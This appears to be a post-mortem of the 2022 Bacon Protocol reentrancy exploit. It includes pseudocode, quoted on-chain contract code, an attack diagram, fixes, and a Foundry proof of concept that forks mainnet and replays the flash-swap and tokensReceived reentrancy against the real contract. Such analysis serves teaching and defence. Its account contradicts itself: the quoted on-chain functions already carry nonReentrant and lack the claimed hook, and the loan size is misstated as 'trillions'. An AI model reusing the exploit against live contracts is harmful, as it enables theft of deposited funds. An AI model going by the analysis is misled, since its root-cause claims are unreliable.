# Bacon Protocol — ERC1820 Callback Reentrancy Flash Loan Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2022-03-01 |
| **Protocol** | Bacon Protocol |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$1,000,000 (USDC) |
| **Attacker** | Attack contract address unconfirmed |
| **Vulnerable Contract** | Bacon [0xb8919522331C59f5C16bDfAA6A121a6E03A91F62](https://etherscan.io/address/0xb8919522331C59f5C16bDfAA6A121a6E03A91F62) |
| **Root Cause** | The `lend()` function invokes the recipient hook (`tokensReceived`) via the ERC1820 registry, allowing reentrancy — enabling immediate `redeem()` calls for a larger withdrawal amount before the deposit is fully processed |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/Bacon_exp.sol) |

---
## 1. Vulnerability Overview

Bacon Protocol is a DeFi protocol providing real-estate-collateralized loans. It has a `lend()` function that deposits USDC in exchange for bHOME tokens, and a `redeem()` function that burns bHOME to withdraw USDC.

Inside the `lend()` function, a hook fires that checks the recipient implementation (`tokensReceived`) via the ERC1820 registry. The attacker exploited this hook by making a reentrant call to `redeem()` within it, withdrawing the entire balance before the deposit was finalized. A flash loan was used to borrow large-scale USDC, maximizing profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable Bacon.lend() (pseudocode)
contract Bacon {
    IERC1820Registry internal erc1820 =
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    function lend(uint256 amount) external {
        // Transfer USDC to the contract
        usdc.transferFrom(msg.sender, address(this), amount);

        // Mint bHOME tokens
        uint256 bHomeAmount = _calculateBHome(amount);
        bHOME.mint(msg.sender, bHomeAmount);

        // ❌ ERC1820 hook fires: invokes tokensReceived callback on recipient (msg.sender)
        // At this point, state has not yet been fully updated
        _callTokensReceived(msg.sender, bHomeAmount);

        // ❌ State update occurs after the callback
        totalLent += amount;
    }

    // ❌ No reentrancy guard on redeem()
    function redeem(uint256 bHomeAmount) external {
        uint256 usdcAmount = _calculateUsdc(bHomeAmount);
        bHOME.burn(msg.sender, bHomeAmount);
        usdc.transfer(msg.sender, usdcAmount);
        totalLent -= usdcAmount;
    }
}

// ✅ Correct pattern
contract BaconFixed {
    bool private locked;

    modifier nonReentrant() {
        require(!locked, "REENTRANCY");
        locked = true;
        _;
        locked = false;
    }

    // ✅ Reentrancy guard and CEI pattern applied
    function lend(uint256 amount) external nonReentrant {
        usdc.transferFrom(msg.sender, address(this), amount);
        totalLent += amount;  // ✅ State updated first
        uint256 bHomeAmount = _calculateBHome(amount);
        bHOME.mint(msg.sender, bHomeAmount);  // External call last
    }
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**Pool13.sol** — Entry point / vulnerable location:
```solidity
// ❌ Root Cause: `lend()` function invokes the recipient hook (`tokensReceived`) via the ERC1820 registry, allowing reentrancy — enabling immediate `redeem()` calls for a larger withdrawal amount
    function lend(
        uint256 amount
    ) public nonReentrant returns (uint256) {
        IERC20Upgradeable(ERCAddress).transferFrom(msg.sender, address(this), amount);  // ❌ Unauthorized transferFrom

        poolLent = poolLent.add(amount);

        super._mint(msg.sender, amount);

        return amount;
    }

    function redeem(  // ❌ Vulnerability
        uint256 amount
    ) public nonReentrant {
        // check to see if sender has enough HOME to redeem
        require(balanceOf(msg.sender) >= amount, "HOME balance insufficient");

        // check to make sure there is liquidity available in the pool to withdraw
        require(amount <= (poolLent - poolBorrowed), "not enough USDC to redeem");

        // check to make sure there's enough unlocked liquidity in the pool.
        // funds staked or locked are unavailable for redemption -- only borrowing.
        uint256 locked = balanceOf(poolStakingAddress) + balanceOf(homeBoostAddress);
        require(amount <= (poolLent - locked), "not enough unlocked USDC to redeem");

        // burn HOME
        super._burn(msg.sender, amount);

        // update the amount of liquidity held
        poolLent = poolLent.sub(amount);

        // send out the USDC
        IERC20Upgradeable(ERCAddress).transfer(msg.sender, amount);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker Contract (implements ERC1820 tokensReceived)
    │
    ├─[1] Uniswap flash swap: borrow 6,360,000,000,000 USDC (6.36 trillion)
    │
    ├─[2] [Inside flash loan callback]
    │       uniswapV2Call() executes
    │       │
    │       ├─[3] USDC.approve(Bacon, 2,120,000,000,000)
    │       │
    │       ├─[4] Bacon.lend(2,120,000,000,000)
    │       │       Deposit USDC → mint bHOME
    │       │       ↓ ERC1820 tokensReceived callback fires
    │       │           │
    │       │           └─ [Reentrant] Bacon.redeem(entire bHOME balance)
    │       │                   Withdraw everything before deposit is processed
    │       │                   Receive more USDC than deposited
    │       │
    │       └─[5] Repay flash loan + transfer profit
    │
    └─[6] Net profit: ~$1,000,000
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IBacon {
    function lend(uint256 amount) external;
    function redeem(uint256 amount) external;
}

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

contract ContractTest is Test {
    IUniswapV2Pair pair =
        IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    IERC20 USDC  = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IBacon bacon = IBacon(0xb8919522331C59f5C16bDfAA6A121a6E03A91F62);
    IERC20 bHOME = IERC20(0xb8919522331C59f5C16bDfAA6A121a6E03A91F62); // Assumed same address

    bool reentrant = false;

    function setUp() public {
        vm.createSelectFork("mainnet", 14_326_931);
    }

    function testExploit() public {
        // [Step 1] Initiate flash swap: borrow 6.36 trillion USDC
        pair.swap(6_360_000_000_000, 0, address(this), "0x");
    }

    // Uniswap flash loan callback
    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
        if (!reentrant) {
            // [Step 2] Attempt to deposit 2.12 trillion USDC
            USDC.approve(address(bacon), type(uint256).max);
            bacon.lend(2_120_000_000_000);

            // [Step 5] Repay flash loan (0.3% fee)
            uint256 repay = (amount0 / 997) * 1000 + 1_000_000;
            USDC.transfer(address(pair), repay);
            USDC.transfer(tx.origin, USDC.balanceOf(address(this)));
        }
    }

    // ERC1820 tokensReceived: automatically called upon receiving bHOME
    function tokensReceived(
        address, address, address, uint256, bytes calldata, bytes calldata
    ) external {
        if (!reentrant) {
            reentrant = true;
            // ⚡ Reentrant: call redeem() before lend() completes
            bacon.redeem(bHOME.balanceOf(address(this)));
            reentrant = false;
        }
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reentrancy Attack (ERC1820 Callback Reentrancy) |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **OWASP DeFi** | Token Standard Callback Abuse |
| **Attack Vector** | ERC1820 `tokensReceived` → redeem() reentrancy |
| **Prerequisites** | Bacon supports ERC1820 hooks and nonReentrant is not applied |
| **Impact** | Large-scale theft proportional to flash loan size |

---
## 6. Remediation Recommendations

1. **Apply ReentrancyGuard**: Apply the `nonReentrant` modifier to the `lend()` and `redeem()` functions.
2. **Follow CEI Pattern**: Complete all state variable updates before any external calls (token minting, callbacks).
3. **Remove or Restrict ERC1820 Hooks**: Remove unnecessary hook calls, or set a lock within the hook to prevent reentrancy.
4. **Restrict Same-Block lend/redeem**: Block immediate withdrawals within the same transaction as a deposit.

---
## 7. Lessons Learned

- **Recurring Danger of Callback Standards**: Callback-based token standards such as ERC777, ERC677, and ERC1820 become reentrancy vectors when the Checks-Effects-Interactions pattern is not followed. This is the root cause.
- **Flash Loans as an Amplifier**: The reentrancy vulnerability itself can be exploited by a sufficiently capitalized attacker without a flash loan. Flash loans are a financing mechanism that amplifies the scale of damage — they are not the cause of the vulnerability.
- **$1M Loss**: Relatively small in scale, but the same pattern applied to a larger protocol would have resulted in significantly greater damage.